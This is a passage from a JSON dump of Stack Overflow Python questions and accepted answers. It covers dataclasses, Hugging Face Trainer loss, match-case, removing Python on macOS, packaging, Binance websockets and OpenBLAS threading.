stuff bring printed.\nRelated questions\nAs of today there aren't many dataclass questions yet (this may change):\n\nExtend dataclass' __repr__ programmatically: This is trying to limit the repr. It should show less fields unless they're explicitly overridden.\nPython dataclass generate hash and exclude unsafe fields: This is for hashing and not related to defaults.\n\n",
    "AcceptedAnswerId": 72161437,
    "AcceptedAnswer": "You could do it like this:\nimport dataclasses\nfrom dataclasses import dataclass\nfrom operator import attrgetter\n\n\n@dataclass(repr=False)\nclass InventoryItem:\n    name: str\n    unit_price: float = 1.00\n    quantity_on_hand: int = 0\n\n    def __repr__(self):\n        nodef_f_vals = (\n            (f.name, attrgetter(f.name)(self))\n            for f in dataclasses.fields(self)\n            if attrgetter(f.name)(self) != f.default\n        )\n\n        nodef_f_repr = \", \".join(f\"{name}={value}\" for name, value in nodef_f_vals)\n        return f\"{self.__class__.__name__}({nodef_f_repr})\"\n        \n\n# Prints: InventoryItem(name=Apple)\nprint(InventoryItem(\"Apple\"))\n\n# Prints: InventoryItem(name=Apple,unit_price=1.05)\nprint(InventoryItem(\"Apple\", unit_price=\"1.05\"))\n\n# Prints: InventoryItem(name=Apple,unit_price=2.10,quantity_on_hand=3)\nprint(InventoryItem(\"Apple\", unit_price='2.10', quantity_on_hand=3))\n\n"
}
{
    "Id": 71581197,
    "PostTypeId": 1,
    "Title": "What is the loss function used in Trainer from the Transformers library of Hugging Face?",
    "Body": "What is the loss function used in Trainer from the Transformers library of Hugging Face?\nI am trying to fine tine a BERT model using the Trainer class from the Transformers library of Hugging Face.\nIn their documentation, they mention that one can specify a customized loss function by overriding the compute_loss method in the class. However, if I do not do the method override and use the Trainer to fine tine a BERT model directly for sentiment classification, what is the default loss function being use? Is it the categorical crossentropy? Thanks!\n",
    "AcceptedAnswerId": 71585375,
    "AcceptedAnswer": "It depends!\nEspecially given your relatively vague setup description, it is not clear what loss will be used. But to start from the beginning, let's first check how the default compute_loss() function in the Trainer class looks like.\nYou can find the corresponding function here, if you want to have a look for yourself (current version at time of writing is 4.17).\nThe actual loss that will be returned with default parameters is taken from the model's output values:\n\n         loss = outputs[\"loss\"] if isinstance(outputs, dict) else outputs[0]\n\nwhich means that the model itself is (by default) responsible for computing some sort of loss and returning it in outputs.\nFollowing this, we can then look into the actual model definitions for BERT (source: here, and in particular check out the model that will be used in your Sentiment Analysis task (I assume a BertForSequenceClassification model.\nThe code relevant for defining a loss function looks like this:\nif labels is not None:\n    if self.config.problem_type is None:\n        if self.num_labels == 1:\n            self.config.problem_type = \"regression\"\n        elif self.num_labels > 1 and (labels.dtype == torch.long or labels.dtype == torch.int):\n            self.config.problem_type = \"single_label_classification\"\n        else:\n            self.config.problem_type = \"multi_label_classification\"\n\n    if self.config.problem_type == \"regression\":\n        loss_fct = MSELoss()\n        if self.num_labels == 1:\n            loss = loss_fct(logits.squeeze(), labels.squeeze())\n        else:\n            loss = loss_fct(logits, labels)\n    elif self.config.problem_type == \"single_label_classification\":\n        loss_fct = CrossEntropyLoss()\n        loss = loss_fct(logits.view(-1, self.num_labels), labels.view(-1))\n    elif self.config.problem_type == \"multi_label_classification\":\n        loss_fct = BCEWithLogitsLoss()\n        loss = loss_fct(logits, labels)\n\n\nBased on this information, you should be able to either set the correct loss function yourself (by changing model.config.problem_type accordingly), or otherwise at least be able to determine whichever loss will be chosen, based on the hyperparameters of your task (number of labels, label scores, etc.)\n"
}
{
    "Id": 71441761,
    "PostTypeId": 1,
    "Title": "How to use match case with a class type",
    "Body": "I want to use match to determine an action to perform based on a class type. I cannot seem to figure out how to do it. I know their are other ways of achieving this, I would just like to know can it be done this way. I am not looking for workarounds of which there are many.\n\nclass aaa():\n    pass\n\nclass bbb():\n    pass\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ:\n        case aaa():\n            print(\"aaa\")\n        case bbb():\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n\nThe output is as follows:\naaa\nbbb\n???\n???\n\n",
    "AcceptedAnswerId": 71442112,
    "AcceptedAnswer": "Try using typ() instead of typ in the match line:\n        class aaa():\n            pass\n\n        class bbb():\n            pass\n\n        def f1(typ):\n            if typ is aaa:\n                print(\"aaa\")\n            elif typ is bbb:\n                print(\"bbb\")\n            else:\n                print(\"???\")\n\n        def f2(typ):\n            match typ():\n                case aaa():\n                    print(\"aaa\")\n                case bbb():\n                    print(\"bbb\")\n                case _:\n                    print(\"???\")\n\n        f1(aaa)\n        f1(bbb)\n        f2(aaa)\n        f2(bbb)        \n\nOutput:\naaa\nbbb\naaa\nbbb\n\nUPDATE:\nBased on OP's comment asking for solution that works for classes more generally than the example classes in the question, here is an answer addressing this:\nclass aaa():\n    pass\n\nclass bbb():\n    pass\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ.__qualname__:\n        case aaa.__qualname__:\n            print(\"aaa\")\n        case bbb.__qualname__:\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n\nOutput:\naaa\nbbb\naaa\nbbb\n\nUPDATE #2:\nBased on this post and some perusal of PEP 364 here, I have created an example showing how a few data types (a Python builtin, a class from the collections module, and a user defined class) can be used by match to determine an action to perform based on a class type (or more generally, a data type):\nclass bbb:\n    pass\n\nclass namespacing_class:\n    class aaa:\n        pass\n\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ.__qualname__:\n        case aaa.__qualname__:\n            print(\"aaa\")\n        case bbb.__qualname__:\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\ndef f3(typ):\n    import collections\n    match typ:\n        case namespacing_class.aaa:\n            print(\"aaa\")\n        case __builtins__.str:\n            print(\"str\")\n        case collections.Counter:\n            print(\"Counter\")\n        case _:\n            print(\"???\")\n\n'''\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n'''\nf3(namespacing_class.aaa)\nf3(str)\nimport collections\nf3(collections.Counter)\n\nOutputs:\naaa\nstr\nCounter\n\nAs stated in this answer in another post:\n\nA variable name in a case clause is treated as a name capture pattern. It always matches and tries to make an assignment to the variable name. ... We need to replace the name capture pattern with a non-capturing pattern such as a value pattern that uses the . operator for attribute lookup. The dot is the key to matching this a non-capturing pattern.\n\nIn other words, if we try to say case aaa: for example, aaa will be interpreted as a name to which we assign the subject (typ in your code) and will always match and block any attempts to match subsequent case lines.\nTo get around this, for class type names (or names generally) that can be specified using a dot (perhaps because they belong to a namespace or another class), we can use the dotted name as a pattern that will not be interpreted as a name capture.\nFor built-in type str, we can use case __builtins__.str:. For the Counter class in Python's collections module, we can use case collections.Counter:. If we define class aaa within another class named namespacing_class, we can use case namespacing_class.aaa:.\nHowever, if we define class bbb at the top level within our Python code, it's not clear to me that there is any way to use a dotted name to refer to it and thereby avoid name capture.\nIt's possible there's a way to specify a user defined class type in a case line and I simply haven't figured it out yet. Otherwise, it seems rather arbitrary (and unfortunate) to be able to do this for dottable types and not for non-dottable ones.\n"
}
{
    "Id": 72005302,
    "PostTypeId": 1,
    "Title": "Completely uninstall Python 3 on Mac",
    "Body": "I installed Python 3 on Mac and installed some packages as well. But then I see AWS lamda does not support Python 3 so I decided to downgrade. I removed Python3 folder in Applications and cleared the trash. But still I see a folder named 3 in /Library/Frameworks/Python.framework/Versions which is causing problems, such as this:\n  $ python3 -m pip install virtualenv\n Requirement already satisfied: virtualenv in      /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (20.14.1)\n Requirement already satisfied: platformdirs=2 in /Library/Frameworks/Python.framework/Versions/3.10/lib/python3.10/site-packages (from virtualenv) (2.5.2) \n\nSo my question is how do I completely uninstall python 3 from my Mac?\n",
    "AcceptedAnswerId": 72005684,
    "AcceptedAnswer": "Removing the app does not completely uninstall that version of Python. You will need to remove the framework directories and their symbolic links.\nDeleting the frameworks\nsudo rm -rf /Library/Frameworks/Python.framework/Versions/[version number]\nreplacing [version number] with 3.10 in your case.\nRemoving symbolic links\nTo list the broken symbolic links.\nls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]'\nAnd to remove these links:\ncd /usr/local/bin\nls -l /usr/local/bin | grep '../Library/Frameworks/Python.framework/Versions/[version number]' | awk '{print $9}' | tr -d @ | xargs rm*\nAs always, please be wary of copying these commands. Please make sure the directories in the inputs are actual working directories before you execute anything.\nThe general idea in the end is to remove the folders and symlinks, and you're good to go.\nHere is another response addressing this process: How to uninstall Python 2.7 on a Mac OS X 10.6.4?\n"
}
{
    "Id": 71592060,
    "PostTypeId": 1,
    "Title": "Makefile - How should I extract the version number embedded in `pyproject.toml`?",
    "Body": "I have a python project with a pyproject.toml file. Typically I store the project's version number in pyproject.toml like this:\n% grep version pyproject.toml \nversion = \"0.0.2\"\n%\n\nI want to get that version number into a Makefile variable regardless of how many spaces wind up around the version terms.\nWhat should I do to extract the pyproject.toml version string into a Makefile environment variable called VERSION?\n",
    "AcceptedAnswerId": 71592061,
    "AcceptedAnswer": "This seemed to work out the best...  I put this in my Makefile\n# grep the version from pyproject.toml, squeeze multiple spaces, delete double\n#   and single quotes, get 3rd val. This command tolerates \n#   multiple whitespace sequences around the version number\nVERSION := $(shell grep -m 1 version pyproject.toml | tr -s ' ' | tr -d '\"' | tr -d \"'\" | cut -d' ' -f3)\n\nSpecial thanks to @charl-botha for the -m 1 grep argument... both gnu and bsd grep support -m in this context.\n"
}
{
    "Id": 71661851,
    "PostTypeId": 1,
    "Title": "TypeError: __init__() got an unexpected keyword argument 'as_tuple'",
    "Body": "While I am testing my API I recently started to get the error below.\n        if request is None:\n>           builder = EnvironBuilder(*args, **kwargs)\nE           TypeError: __init__() got an unexpected keyword argument 'as_tuple'\n\n/usr/local/lib/python3.7/site-packages/werkzeug/test.py:1081: TypeError\n\nAs I read from the documentation in the newer version of Werkzeug the as_tuple parameter is removed.\nPart of my test code is\n\nfrom flask.testing import FlaskClient\n\n@pytest.fixture(name='test_client')\ndef _test_client() -> FlaskClient:\n    app = create_app()\n    return app.test_client()\n\n\nclass TestPeerscoutAPI:\n    def test_should_have_access_for_status_page(self, test_client: FlaskClient):\n        response = test_client.get('/api/status')\n        assert _get_ok_json(response) == {\"status\": \"OK\"}\n\nAny help would be greatly appreciated.\n",
    "AcceptedAnswerId": 71662972,
    "AcceptedAnswer": "As of version 2.1.0, werkzeug has removed the as_tuple argument to Client. Since Flask wraps werkzeug and you're using a version that still passes this argument, it will fail. See the exact change on the GitHub PR here.\nYou can take one of two paths to solve this:\n\nUpgrade flask\n\nPin your werkzeug version\n\n\n# in requirements.txt\nwerkzeug==2.0.3\n\n"
}
{
    "Id": 71356388,
    "PostTypeId": 1,
    "Title": "How to connect to User Data Stream Binance?",
    "Body": "I need to listen to User Data Stream, whenever there's an Order Event - order execution, cancelation, and so on - I'd like to be able to listen to those events and create notifications.\nSo I got my \"listenKey\" and I'm not sure if it was done the right way but I executed this code and it gave me something like listenKey.\nCode to get listenKey:\ndef get_listen_key_by_REST(binance_api_key):\n    url = 'https://api.binance.com/api/v1/userDataStream'\n    response = requests.post(url, headers={'X-MBX-APIKEY': binance_api_key}) \n    json = response.json()\n    return json['listenKey']\n\nprint(get_listen_key_by_REST(API_KEY))\n\nAnd the code to listen to User Data Stream - which doesn't work, I get no json response.\nsocket = f\"wss://fstream-auth.binance.com/ws/btcusdt@markPrice?listenKey=\"\n\ndef on_message(ws, message):\n    json_message = json.loads(message)\n    print(json_message)\n\ndef on_close(ws):\n    print(f\"Connection Closed\")\n    # restart()\n\ndef on_error(ws, error):\n    print(f\"Error\")\n    print(error)\n\nws = websocket.WebSocketApp(socket, on_message=on_message, on_close=on_close, on_error=on_error)\n\nI have read the docs to no avail. I'd appreciate it if someone could point me in the right direction.\n",
    "AcceptedAnswerId": 71445546,
    "AcceptedAnswer": "You can create a basic async user socket connection from the docs here along with other useful info for the Binance API. Here is a simple example:\nimport asyncio\nfrom binance import AsyncClient, BinanceSocketManager\n\nasync def main():\n    client = await AsyncClient.create(api_key, api_secret, tld='us')\n    bm = BinanceSocketManager(client)\n    # start any sockets here, i.e a trade socket\n    ts = bm.user_socket()\n    # then start receiving messages\n    async with ts as tscm:\n        while True:\n            res = await tscm.recv()\n            print(res)\n    await client.close_connection()\n\nif __name__ == \"__main__\":\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(main())\n\n"
}
{
    "Id": 71703734,
    "PostTypeId": 1,
    "Title": "How to upgrade version of pyenv on Ubuntu",
    "Body": "I wanted to install python 3.10 but that version is not available on pyenv version list.\nchecked by pyenv install --list.\nPeople suggested to upgrade pyenv that but I do not see help related to updating pyenv.\n",
    "AcceptedAnswerId": 71703884,
    "AcceptedAnswer": "pyenv isn't really 'installed' in a traditional sense, it's just a git checkout. All you have to do to update is\ncd ~/.pyenv\ngit pull\n\nThat also updates the list of available python versions.\n"
}
{
    "Id": 71701629,
    "PostTypeId": 1,
    "Title": "ImportError: No module named _thread",
    "Body": "Compiling python2 in vscode gives an error.\nBut when I compile python3 it succeeds.\nprint('test')\n\nreturns: ImportError: No module named _thread\nPS C:\\source>  c:; cd 'c:\\source'; & 'C:\\Python27\\python.exe' 'c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\launcher' '52037' '--' 'c:\\source\\test.py' \nTraceback (most recent call last):\n  File \"C:\\Python27\\lib\\runpy.py\", line 174, in _run_module_as_main\n    \"__main__\", fname, loader, pkg_name)\n  File \"C:\\Python27\\lib\\runpy.py\", line 72, in _run_code\n    exec code in run_globals\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\__main__.py\", line 43, in \n    from debugpy.server import cli\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy/../debugpy\\server\\__init__.py\", line 9, in \n    import debugpy._vendored.force_pydevd  # noqa\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy/../debugpy\\_vendored\\force_pydevd.py\", line 37, in \n    pydevd_constants = import_module('_pydevd_bundle.pydevd_constants')\n  File \"C:\\Python27\\lib\\importlib\\__init__.py\", line 37, in import_module\n    __import__(name)\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\_vendored\\pydevd\\_pydevd_bundle\\pydevd_constants.py\", line 362, in   \n    from _pydev_bundle._pydev_saved_modules import thread, threading\n  File \"c:\\Users\\keinblue\\.vscode\\extensions\\ms-python.python-2022.4.0\\pythonFiles\\lib\\python\\debugpy\\_vendored\\pydevd\\_pydev_bundle\\_pydev_saved_modules.py\", line 94, in \n    import _thread as thread;    verify_shadowed.check(thread, ['start_new_thread', 'start_new', 'allocate_lock'])\nImportError: No module named _thread\n\n",
    "AcceptedAnswerId": 71704278,
    "AcceptedAnswer": "There is an issue with the vscode python extension version 2022.4.0\njust downgrade to version 2022.2.1924087327 and it will work as it works for me now\nJust follow these steps:\n\nGo to extensions.\nClick on Gear Icon for the installed extension\nClick on Install Another Version\nselect the version you wish to install\n\n\n"
}
{
    "Id": 72238460,
    "PostTypeId": 1,
    "Title": "Python ImportError: sys.meta_path is None, Python is likely shutting down",
    "Body": "When using __del__\ndatetime.date.today() throws ImportError: sys.meta_path is None, Python is likely shutting down\nimport datetime\nimport time\nimport sys\n\n\nclass Bug(object):\n\n    def __init__(self):\n        print_meta_path()\n\n    def __del__(self):\n        print_meta_path()\n        try_date('time')\n        try_date('datetime')\n\n\ndef print_meta_path():\n    print(f'meta_path: {sys.meta_path}')\n\n\ndef try_date(date_type):\n    try:\n        print('----------------------------------------------')\n        print(date_type)\n        if date_type == 'time':\n            print(datetime.date.fromtimestamp(time.time()))\n        if date_type == 'datetime':\n            print(datetime.date.today())\n    except Exception as ex:\n        print(ex)\n\n\nif __name__ == '__main__':\n    print(sys.version)\n    bug = Bug()\n\noutput with different envs (3.10, 3.9, 3.7):\n3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:39:04) [GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.9.12 | packaged by conda-forge | (main, Mar 24 2022, 23:22:55)\n[GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.7.12 | packaged by conda-forge | (default, Oct 26 2021, 06:08:53)\n[GCC 9.4.0]\nmeta_path: [, , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\n3.8.10 (default, Mar 15 2022, 12:22:08) \n[GCC 9.4.0]\nmeta_path: [, , ]\nmeta_path: None\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\nsys.meta_path is None, Python is likely shutting down\n\nWhy is that happening?\nI need to use requests which use urllib3 connection.py\n380:  is_time_off = datetime.date.today() \n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py\", line 117, in post\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/api.py\", line 61, in request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py\", line 529, in request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/sessions.py\", line 645, in send\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/requests/adapters.py\", line 440, in send\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 703, in urlopen\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 386, in _make_request\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connectionpool.py\", line 1040, in _validate_conn\n  File \"/home/liron/mambaforge/envs/dm-sdk-dev/lib/python3.10/site-packages/urllib3/connection.py\", line 380, in connect\nImportError: sys.meta_path is None, Python is likely shutting down\n\nswitching the line to\n380:  is_time_off = datetime.date.fromtimestamp(time.time())  solve it.\nOS Linux-5.13.0-41-generic-x86_64-with-glibc2.31\nurllib3 1.26.9\n\nI already tried to rebind __del__ arguments default\ndef __del__(self, datetime=datetime):....\nDoes anyone have an idea? thanks\n",
    "AcceptedAnswerId": 72275619,
    "AcceptedAnswer": "Using atexit provide the same behavior as __del__ but works\nimport datetime\nimport time\nimport sys\nimport atexit\n\n\nclass Bug(object):\n\n    def __init__(self):\n        print_meta_path()\n        atexit.register(self.__close)\n\n    def __close(self):\n        print_meta_path()\n        try_date('time')\n        try_date('datetime')\n\n\ndef print_meta_path():\n    print(f'meta_path: {sys.meta_path}')\n\n\ndef try_date(date_type):\n    try:\n        print('----------------------------------------------')\n        print(date_type)\n        if date_type == 'time':\n            print(datetime.date.fromtimestamp(time.time()))\n        if date_type == 'datetime':\n            print(datetime.date.today())\n    except ImportError:\n        print('')\n\n\nif __name__ == '__main__':\n    print(sys.version)\n    bug = Bug()\n\noutput:\n3.10.4 | packaged by conda-forge | (main, Mar 24 2022, 17:38:57) [GCC 10.3.0]\nmeta_path: [, , , ]\nmeta_path: [, , , ]\n----------------------------------------------\ntime\n2022-05-17\n----------------------------------------------\ndatetime\n2022-05-17\n\nProcess finished with exit code 0\n\n"
}
{
    "Id": 72280762,
    "PostTypeId": 1,
    "Title": "pip broke after downlading python-certifi-win32",
    "Body": "I have downloaded python for the first time in a new computer(ver 3.10.4).\nI have download the package python-certifi-win32, after someone suggested it as a solution to a SSL certificate problem in a similar question to a problem I had.\nSince then, pip has completely stopped working, to the point where i can't not run pip --version\nEvery time the same error is printed, it is mostly seemingly junk(just a deep stack trace), but the file at the end is different.\nstart of the printed log:\nTraceback (most recent call last):\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 89, in _tempfile\n    os.write(fd, reader())\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\abc.py\", line 371, in read_bytes\n    with self.open('rb') as strm:\n  File \"C:\\Users\\---\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_adapters.py\", line 54, in open\n    raise ValueError()\nValueError\n\nDuring handling of the above exception, another exception occurred:\n\nlast row of the printed log:\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\\\Users\\\\-----\\\\AppData\\\\Local\\\\Temp\\\\tmpunox3fhw'\n\n",
    "AcceptedAnswerId": 72293534,
    "AcceptedAnswer": "I found the answer in another question -\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32\nbasically, you should remove two files that initialize python-certifi-win32 when running pip. the files are located in the directory:\nC:\\Users\\\\AppData\\Local\\Programs\\Python\\Python310\\Lib\\site-packages\n\nand their names are:\npython-certifi-win32-init.pth\ndistutils-precedence.pth\n\nShoutout to Richard from the mentioned post :)\n"
}
{
    "Id": 71737743,
    "PostTypeId": 1,
    "Title": "How can I change playback speed of an audio file in python whilst it is playing?",
    "Body": "I've done alot of searching to try and find a way to achieve this but the solutions I've found either don't do what I need or I don't understand them.\nI'm looking for a way of playing a sound in python (non-blocking) that allows me to change the playback speed in real time, as it's playing, with no gaps or cutouts.\nChanging the pitch is fine. Audio quality isn't even that important.\nMost of the solutions I've found only allow setting the playback speed once, before the file is played.\n",
    "AcceptedAnswerId": 71748928,
    "AcceptedAnswer": "I've found a solution, using python-mpv, a wrapper for mpv.io\nfrom pynput.keyboard import Key, Listener\nimport mpv\nspeed=1\n\n#quick function to change speed via keyboard. \ndef on_press(key):\n\n    global speed\n\n    if key.char == 'f' :\n        speed=speed-0.1\n        player.speed=speed\n    if key.char == 'g' :\n        speed=speed+0.1\n        player.speed=speed\n\nplayer = mpv.MPV(ytdl=True)\nplayer.play('/Users/regvardy/mediapipe_faceswap-main/test.wav')\nwith Listener(\n        on_press=on_press) as listener:\n    listener.join()\nwhile True:\n    \n    player.speed=speed\n\nI haven't tested it for stability yet.\nIt feels like a workaround rather than me actually finding out how to do it so I may try and find a different solution.\n"
}
{
    "Id": 72277275,
    "PostTypeId": 1,
    "Title": "How to monitor per-process network usage in Python?",
    "Body": "I'm looking to troubleshoot my internet issue so I need a way to track both my latency and which application is using how much network bandwidth.\nI've already sorted out checking latency, but now I need a way to monitor each process' network usage (KB/s), like how it appears in Windows Task Manager.\nBefore you suggest a program, unless it's able to record the values with a timestamp then that's not what I'm looking for. I'm asking for a Pythonic way because I need to record the network bandwidth and latency values at the same time so I can figure out if a specific process is causing latency spikes.\nSo here's the info I need:\nTime | Process ID | Process Name | Down Usage | Up Usage | Network Latency |\nAlso, please don't link to another Stackoverflow question unless you know their solution works. I've looked through plenty already and none of them work, which is why I'm asking again.\n",
    "AcceptedAnswerId": 72310057,
    "AcceptedAnswer": "Following the third section of this guide provided me with all of the information listed in the post, minus latency. Given that you said you already had measuring latency figured out, I assume this isn't an issue.\nLogging this to csv/json/whatever is pretty easy, as all of the information is stored in panda data frames.\nAs this shows the time the process was created, you can use datetime to generate a new timestamp at the time of logging.\nI tested this by logging to a csv after the printing_df variable was initialized, and had no issues.\n"
}
{
    "Id": 72520366,
    "PostTypeId": 1,
    "Title": "Why does `functools.partial` not inherit `__name__` and other meta data by default?",
    "Body": "I am wondering why meta data (e.g. __name__, __doc__) for the wrapped method/function by partial is not inherited by default. Instead, functools provides the update_wrapper function.\nWhy it is not done by default is not mentioned anywhere (as far as I could see) e.g. here and many tutorials on functools.partial talk about how to \"solve the issue\" of a missing __name__.\nAre there examples where inheriting this information causes problems/confusion?\n",
    "AcceptedAnswerId": 72520451,
    "AcceptedAnswer": "Think about what that would actually look like:\ndef add(x, y):\n    \"Adds two numbers\"\n    return x + y\n\nadd_5 = partial(add, 5)\n\nWould it actually make sense for add_5 to have __name__ set to \"add\" and __doc__ set to \"Adds two numbers\"?\nThe callable created by partial behaves completely differently from the original function. It wouldn't be appropriate for the new callable to inherit the name and docstring of a function with completely different behavior.\n"
}
{
    "Id": 72018887,
    "PostTypeId": 1,
    "Title": "How to build a universal wheel with pyproject.toml",
    "Body": "This is the project directory structure\n.\n\u251c\u2500\u2500 meow.py\n\u2514\u2500\u2500 pyproject.toml\n\n0 directories, 2 files\n\nThis is the meow.py:\ndef main():\n    print(\"meow world\")\n\nThis is the pyproject.toml:\n[build-system]\nrequires = [\"setuptools\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"meowpkg\"\nversion = \"0.1\"\ndescription = \"a package that meows\"\n\n[project.scripts]\nmeow_world = \"meow:main\"\n\nWhen building this package, no matter whether with python3 -m pip wheel . or using python3 -m build, it creates a file named like meowpkg-0.1-py3-none-any.whl which can not be installed on Python 2.\n$ python2.7 -m pip install meowpkg-0.1-py3-none-any.whl\nERROR: meowpkg-0.1-py3-none-any.whl is not a supported wheel on this platform.\n\nBut \"meowpkg\" actually works on Python 2 as well. How to instruct setuptools and/or wheel to create a universal wheel tagged like meowpkg-0.1-py2.py3-none-any.whl, without using the old setup.cfg/setup.py ways?\nCurrent workaround:\necho \"[bdist_wheel]\\nuniversal=1\" > setup.cfg && python3 -m build && rm setup.cfg\n\n",
    "AcceptedAnswerId": 72524833,
    "AcceptedAnswer": "Add this section into the pyproject.toml:\n[tool.distutils.bdist_wheel]\nuniversal = true\n\n"
}
{
    "Id": 72663092,
    "PostTypeId": 1,
    "Title": "Getting numpy.linalg.svd and numpy matrix multiplication to use multithreadng",
    "Body": "I have a script that uses a lot of numpy and numpy.linalg functions and after some reaserch it tourned out that supposedly they automaticaly use multithreading. Altought that, my htop display always shows just one thread being used to run my script.\nI am new to multithreading and I don\u00b4t quite now how to set up it correctly.\nI am mostly making use of numpy.linalg.svd\nHere is the output of numpy.show_config()\nopenblas64__info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nblas_ilp64_opt_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nopenblas64__lapack_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nlapack_ilp64_opt_info:\n    libraries = ['openblas64_', 'openblas64_']\n    library_dirs = ['/usr/local/lib']\n    language = c\n    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]\n    runtime_library_dirs = ['/usr/local/lib']\nSupported SIMD extensions in this NumPy install:\n    baseline = SSE,SSE2,SSE3\n    found = SSSE3,SSE41,POPCNT,SSE42,AVX,F16C,FMA3,AVX2\n    not found = AVX512F,AVX512CD,AVX512_KNL,AVX512_KNM,AVX512_SKX,AVX512_CLX,AVX512_CNL,AVX512_ICL\n\nMRE\nimport numpy as np \nimport tensorly as ty \n\n\ntensor = np.random.rand(32,32,32,32)\n\nunfolding = ty.unfold(tensor,0)\nunfolding = unfolding @ unfolding.transpose()\nU,S,_ = np.linalg.svd(unfolding)\n\n\nUpdate\nAs suggested in the accepted answer, rebuilding numpy with MKL solved the issue.\n",
    "AcceptedAnswerId": 72669414,
    "AcceptedAnswer": "The main issue is that the size of the matrices is too small for threads to be really worth it on all platforms. Indeed, OpenBLAS uses OpenMP to create threads regarding the size of the matrix. Threads are generally created once but the creation can take from dozens of microseconds to dozens of milliseconds regarding the machine (typically hundreds of microseconds on a regular PC). The bigger the number of cores on the machine the bigger the number of threads to create and so the bigger the overhead. When the OpenMP thread pool is reused, there are still overheads to pay mainly due to the distribution of the work and synchronizations between threads though the overheads are generally significantly smaller (typically an order of magnitude smaller).\nThat being said, OpenBLAS makes clearly sub-optimal choices when the output matrix is tiny compared to the input ones (which is your case). Indeed, OpenBLAS can hardly know the parallel overhead before running the target kernel so it has to make a choice: set a threshold typically based on the size of the input matrix so to define when the kernel will be executed sequentially or with multiple threads. This is critical for very small kernel to still be fast as well as huge ones to remain competitive with other BLAS implementations. The thing is this threshold is not perfectly chosen. It looks like OpenBLAS only look the size of the output matrix which is clearly sub-optimal for \"thin\" matrices like in your code (eg. 50x1000000 @ 1000000x50). An empirical analysis show that the threshold is arbitrary set to 100x100 in your case: beyond this threshold, OpenBLAS use multiple threads but not otherwise. The thing is threads are already useful for significantly smaller matrices in your case on most platforms (eg. for 64x64x64x64 tensors).\nThis threshold is tuned by compile-time definitions like 